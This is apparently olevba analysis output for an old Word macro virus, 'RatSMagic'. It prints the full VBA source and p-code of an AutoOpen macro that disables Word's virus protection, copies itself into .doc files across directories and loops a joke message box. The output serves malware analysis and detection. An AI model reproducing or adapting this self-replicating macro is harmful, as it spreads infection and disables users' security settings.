olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Rsm
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Rsm - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO RatSMagic.bas 
in file: Virus.MSWord.Rsm - OLE stream: 'Macros/VBA/RatSMagic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Application.ScreenUpdating = False
WordBasic.DisableAutoMacros 0
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
rsminf: FileName$ = CurDir$ + "\" + Dir("*.doc")
On Error GoTo payl
Open FileName$ For Input As #1
Seek #1, 521
RSM$ = Input$(3, #1)
Close #1
If RSM$ = Chr$(1) + Chr$(18) + Chr$(191) Then GoTo chgdir
Open FileName$ For Append As #1
Seek #1, 523
Print #1, Chr$(1) + Chr$(18) + Chr$(191) + Chr$(0) + Chr$(0)
Close #1
rsmdoc = ActiveDocument.FullName
Application.Documents.Open FileName
Application.OrganizerCopy Source:=rsmdoc, Destination:=FileName, Name:="RatSMagic", Object:=wdOrganizerObjectProjectItems
Application.Documents.Save
ActiveDocument.Close
chgdir: ChDir ".."
GoTo rsminf
payl: If Rnd() <= 0.666 And Rnd() >= 0.666 Then GoTo JokE Else GoTo ecsit
JokE: MsgBox "RatSMagic by Reptile", , "bwahahahaha!!!"
GoTo JokE
ecsit:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Rsm
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/RatSMagic - 2345 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' 	Label rsminf 
' 	Ld CurDir$ 
' 	LitStr 0x0001 "\"
' 	Add 
' 	LitStr 0x0005 "*.doc"
' 	ArgsLd Dir 0x0001 
' 	Add 
' 	St FileName$ 
' Line #6:
' 	OnError payl 
' Line #7:
' 	Ld FileName$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #8:
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDI2 0x0209 
' 	Seek 
' Line #9:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Sharp 
' 	ArgsLd Input$$ 0x0002 
' 	St RSM$ 
' Line #10:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #11:
' 	Ld RSM$ 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0012 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00BF 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo chgdir 
' 	EndIf 
' Line #12:
' 	Ld FileName$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #13:
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDI2 0x020B 
' 	Seek 
' Line #14:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0012 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00BF 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #15:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #16:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St rsmdoc 
' Line #17:
' 	Ld FileName 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemCall Option 0x0001 
' Line #18:
' 	Ld rsmdoc 
' 	ParamNamed Source 
' 	Ld FileName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "RatSMagic"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #19:
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemCall Save 0x0000 
' Line #20:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #21:
' 	Label chgdir 
' 	LitStr 0x0002 ".."
' 	ArgsCall ChDir 0x0001 
' Line #22:
' 	GoTo rsminf 
' Line #23:
' 	Label payl 
' 	ArgsLd Rnd 0x0000 
' 	LitR8 0x5A1D 0x3B64 0x4FDF 0x3FE5 
' 	Le 
' 	ArgsLd Rnd 0x0000 
' 	LitR8 0x5A1D 0x3B64 0x4FDF 0x3FE5 
' 	Ge 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo JokE 
' 	Else 
' 	BoSImplicit 
' 	GoTo ecsit 
' 	EndIf 
' Line #24:
' 	Label JokE 
' 	LitStr 0x0014 "RatSMagic by Reptile"
' 	ParamOmitted 
' 	LitStr 0x000E "bwahahahaha!!!"
' 	ArgsCall MsgBox 0x0003 
' Line #25:
' 	GoTo JokE 
' Line #26:
' 	Label ecsit 
' Line #27:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

